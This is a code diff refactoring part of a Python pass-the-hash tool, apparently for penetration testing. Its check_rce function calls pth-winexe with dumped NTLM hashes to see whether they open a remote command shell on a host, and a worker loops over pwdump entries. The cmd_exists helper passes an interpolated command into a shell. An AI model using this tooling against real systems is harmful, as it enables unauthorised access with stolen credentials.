@@ -55,17 +55,17 @@ def info(txt):
         print (txt)
 
 def success(txt):
-    info(colored('[+] '+txt, 'green', attrs=['bold']))
+    info(colored(f'[+] {txt}', 'green', attrs=['bold']))
 
 def warning(txt):
-    info(colored('[*] '+txt, 'yellow'))
+    info(colored(f'[*] {txt}', 'yellow'))
 
 def verbose(txt):
     if OPTIONS.v:
-        info(colored('[?] '+txt, 'white'))
+        info(colored(f'[?] {txt}', 'white'))
 
 def err(txt):
-    info(colored('[!] '+txt, 'red'))
+    info(colored(f'[!] {txt}', 'red'))
 
 class Command(object):
     def __init__(self, cmd):
@@ -99,30 +99,32 @@ def init_worker():
     signal.signal(signal.SIGINT, signal.SIG_IGN)
 
 def cmd_exists(cmd):
-    return subprocess.call("type " + cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
+    return (
+        subprocess.call(
+            f"type {cmd}",
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+        == 0
+    )
 
 def check_rce(host, username, hash, port):
     verbose('\tChecking whether provided hash can be used to PTH remote code execution')
 
     if cmd_exists('pth-winexe'):
         userswitch = '%s%%%s' % (username, hash)
-        c = Command('pth-winexe -U %s //%s cmd' % (userswitch, host))
-        if c.run('exit\n', TIMEOUT):
-            pass
-        else:
+        c = Command(f'pth-winexe -U {userswitch} //{host} cmd')
+        if not c.run('exit\n', TIMEOUT):
             verbose('\tPTH-Winexe had to be terminated.')
         out, error = c.get_output()
         if 'Microsoft' in out and '(C) Copyright' in out and '[Version' in out:
             return True
-        else:
-            errorm = error[error.find('NT_STATUS'):].strip()
-            if not errorm.startswith('NT_STATUS'):
-                if 'NT_STATUS' in error:
-                    errorm = error
-                else:
-                    errorm = 'Unknown error'
-            if OPTIONS.v:
-                err('\tCould not spawn shell using PTH: ' + errorm)
+        errorm = error[error.find('NT_STATUS'):].strip()
+        if not errorm.startswith('NT_STATUS'):
+            errorm = error if 'NT_STATUS' in error else 'Unknown error'
+        if OPTIONS.v:
+            err('\tCould not spawn shell using PTH: ' + errorm)
     else:
         warning('\tPlease check above hash whether using it you can access writeable $IPC share to execute cmd.')
 
@@ -151,7 +153,7 @@ def correct_hash(hash):
     if '*' in nthash:
         nthash = '0' * 32
 
-    return lmhash + ':' + nthash
+    return f'{lmhash}:{nthash}'
 
 def worker(stopevent, pwdump, machine):
     for user, hash in pwdump.items():
